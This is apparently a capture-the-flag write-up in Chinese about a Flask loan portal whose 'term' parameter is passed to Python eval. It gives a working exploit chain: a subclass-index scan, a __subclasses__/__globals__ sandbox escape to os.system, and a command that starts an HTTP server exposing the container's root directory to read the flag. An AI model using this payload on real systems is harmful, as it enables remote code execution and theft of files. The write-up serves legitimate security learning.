## 题解

### 入口与指纹

Flask 贷款门户：登录页注释给 `test:test`，登录后 `/home`、`/profile`、`/loan_details`、`/logout`。
`/loan_details` 的「Show Amortization Table」按钮把 iframe 指向 **`/amortization?term=60`**。

### 关键观察

**1. `term` 不是被 `int()` 解析，而是直接被 `eval`。**

| term | 结果 |
| --- | --- |
| `60` | 60 行表格 |
| `60+1` | 61 行 |
| `60-1` | 59 行 |
| `0x3c` | 60 行（十六进制求值） |
| `60*1` | 60 行 |
| `60.5`、`1e3` | 500（float 传给 `range`） |
| `60abc` | 500（NameError 之外的语法/求值错误） |

**2. 过滤只挡 `{` `}` `%` 三个字符。**

逐字符探测（`term=60<ch>60`）：`{`/`}`/`%` → 400
`GET parameter 'term' contains forbidden characters.`；其余全部放行（`_`、`[`、`]`、`'`、`(`、`)`、`.`、`/`、空格…）。

**3. 沙箱没有裁掉 `__class__` / `__subclasses__`。**

```text
(1 if ().__class__.__base__.__subclasses__() else 0)   -> 200（可调用）
().__class__.__base__.__subclasses__()[133].__name__   -> '_wrap_close'
```

（列表推导式在这个环境里会 500，所以要用**直接下标**，先用等值比较扫出下标。）

### 利用链

```bash
T=$(head -1 .target)
cj=$(mktemp)
curl -s -c $cj -b $cj -d 'username=test&password=test' "http://$T/login"
# 1. 扫出 _wrap_close 下标（133 / 217 都命中）
for i in $(seq 0 320); do
  n=$(curl -s -b $cj -G --data-urlencode \
      "term=(1 if ().__class__.__base__.__subclasses__()[$i].__name__=='_wrap_close' else 0)" \
      "http://$T/amortization" | wc -c)
  [ "$n" = "986" ] && echo "hit $i"
done
# 2. 用 os.system 起静态服务（返回值丢进 tuple 的第 2 位，保证 range() 拿到 int）
curl -s -b $cj -G --data-urlencode \
  "term=( ().__class__.__base__.__subclasses__()[133].__init__.__globals__['system']('setsid python3 -m http.server 8899 --directory / >/dev/null 2>&1 &'), 60 )[1]" \
  "http://$T/amortization" > /dev/null
# 3. 读 flag（根目录是 /flag，不是 /flag.txt）
curl -s "http://$T:8899/flag"
```

### flag 位置

容器根目录 `/flag`（`/flag.txt` 不存在），通过自建 8899 静态服务读取。

## 复盘

- **参数「算了一下」往往就是 `eval`。** 用 `0x3c` 这种数字字面量一试就知道：
  `int()` 不会接受 `0x3c`，但 `eval` 会。
- **`60.5`/`1e3` 报 500 反证了 `range()` 直接吃 eval 结果**，也提示我们用 tuple 取第二项来「同时执行代码并返回整数」。
- **过滤字符表要逐字符测。** 这里只挡 `{}`+`%`（应该是为了防模板），`__`、`[]`、`'` 全放行，等于没有沙箱。
- **列表推导式被拦时改用下标扫描。** 300 次请求就能定位 `_wrap_close`，比绕沙箱语法便宜。
- 同族的 `063/102/104` 也有 `/amortization`，但那里的 `term` 只做 `float()` 校验（见各自探索记录），没有这条链。
